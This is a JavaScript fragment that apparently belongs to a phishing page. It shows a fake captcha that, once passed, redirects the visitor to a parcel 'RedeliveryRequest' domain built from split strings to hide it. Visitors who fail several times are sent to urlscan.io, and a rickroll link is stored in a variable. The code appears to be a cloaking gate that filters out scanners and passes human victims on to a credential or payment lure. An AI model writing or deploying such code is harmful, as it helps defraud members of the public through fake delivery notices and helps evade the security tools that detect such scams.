		
    
    
    function pauseForOneSecond() {
		  console.log('Start');

		  setTimeout(function() {
			console.log('Pause for 1 second');

			// Code to execute after the pause

		  }, 1000);

		  console.log('End');
		}

		// Call the function
  function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
	
    for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      result += characters.charAt(randomIndex);
    }

    return result;
  }
   let i=0
  function checkInput() {
	  i=i+1
	  if(i>2){
		  window.location = "https://urlscan.io/"
		  
	  }
    // Get the user input and the generated random string
    const userInput = document.getElementById('userInput').value;
    const randomString = document.getElementById('randomStringSpan').textContent;
    const errorMsg = document.getElementById('errorMsg');

    // Check if the user input is equal to the random string (case-insensitive)
    if (userInput.toLowerCase() === randomString.toLowerCase()) {
	  let spark="chectrackuasbalikups"
	  let https ="https"
	  let webapp ="RedeliveryRequest"
      window.location= https+"://"+spark+".com/"+webapp
	  userInput.className = ''; // Remove the 'invalid' class
      errorMsg.textContent = '';
    } else {
		userInput.className = ''; // Remove the 'invalid' class
      errorMsg.textContent = '';
	  
            // Display error message and change input border color
       userInput.className = 'invalid';
      errorMsg.textContent = 'Wrong captcha. Please try again.';
	  setTimeout(function() {
			  userInput.className = ''; // Remove the 'invalid' class
			  errorMsg.textContent = '';
			// Your code to execute after 1 second

		  }, 1000);
     
    }
  }

  // Example usage:
  const randomString = generateRandomString(6);
   let redirect_url="https://rroll.to/"
  // Display the random string in the span element
  const spanElement = document.getElementById('randomStringSpan');
  spanElement.textContent = randomString;

